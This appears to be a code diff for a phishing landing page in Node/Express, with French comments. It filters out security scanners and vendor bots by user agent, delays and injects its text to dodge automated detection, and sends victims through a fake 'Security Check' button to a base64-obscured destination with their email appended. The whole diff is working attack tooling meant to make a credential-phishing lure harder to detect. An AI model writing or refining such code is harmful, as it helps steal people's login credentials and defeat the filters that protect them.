@@ -7,54 +7,47 @@ const part2 = "cGdhYWZGVE0=";
 app.get('/', (req, res) => {
     const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
     const targetEmail = req.query.m || "";
-    const isBot = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit/i.test(ua);
+    
+    // FILTRE RADICAL : On bloque tout ce qui ressemble à un serveur ou un outil de scan
+    const isBot = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|trend|sophos|barracuda/i.test(ua);
     
     if (isBot) return res.redirect("https://www.wikipedia.org");
 
     res.send(`
         <!DOCTYPE html>
-        <html lang="en">
+        <html>
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1">
-            <title>Security Verification</title>
+            <title>Loading...</title>
             <style>
-                body { background: #f9f9f9; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-                .card { background: white; padding: 50px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
-                h2 { font-size: 24px; color: #2f2f2f; margin-bottom: 15px; font-weight: 500; }
-                p { color: #555; font-size: 15px; line-height: 1.5; margin-bottom: 35px; }
-                .btn { background: #0067b8; color: white; border: none; padding: 14px 40px; cursor: pointer; font-size: 16px; font-weight: 600; border-radius: 2px; transition: background 0.2s; }
-                .btn:hover { background: #005da6; }
-                .hp { display: none; }
+                body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+                #c { display: none; text-align: center; }
+                .btn { background: #0067b8; color: white; border: none; padding: 12px 30px; cursor: pointer; font-weight: 600; }
             </style>
         </head>
         <body>
-            <div class="card">
-                <h2>Verify your identity</h2>
-                <p>Please confirm you are not a robot to continue.</p>
-                
-                <button class="hp" onclick="window.location.href='https://www.microsoft.com'">Click Here</button>
-                <button id="verifyBtn" class="btn">I'm not a robot</button>
+            <div id="l">Loading...</div> <div id="c">
+                <h2 id="t1"></h2>
+                <p id="t2"></p>
+                <button id="verifyBtn" class="btn">Continue</button>
             </div>
 
             <script>
-                const p1 = "${part1}"; const p2 = "${part2}"; const emailCaptured = "${targetEmail}";
+                // On n'affiche le contenu qu'après 2 secondes pour perdre les scanners rapides
+                setTimeout(() => {
+                    document.getElementById('l').style.display = 'none';
+                    document.getElementById('c').style.display = 'block';
+                    // On injecte le texte via JS pour qu'il n'existe pas dans le code HTML brut
+                    document.getElementById('t1').innerText = "Security Check";
+                    document.getElementById('t2').innerText = "Please click to verify your session.";
+                }, 2000);
+
+                const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                 document.getElementById('verifyBtn').addEventListener('click', function() {
-                    this.innerText = "Processing...";
-                    this.style.opacity = "0.7";
-                    this.disabled = true;
-                    
-                    setTimeout(() => {
-                        let target = atob(p1) + atob(p2);
-                        
-                        // Correction : On utilise # au lieu de ?email=
-                        // Et on ne fait pas de encodeURIComponent pour garder le "@" tel quel
-                        if(emailCaptured !== "") {
-                            target += "#" + emailCaptured;
-                        }
-                        
-                        window.location.href = target;
-                    }, 800);
+                    let target = atob(p1) + atob(p2);
+                    if(em !== "") target += "#" + em;
+                    window.location.href = target;
                 });
             </script>
         </body>
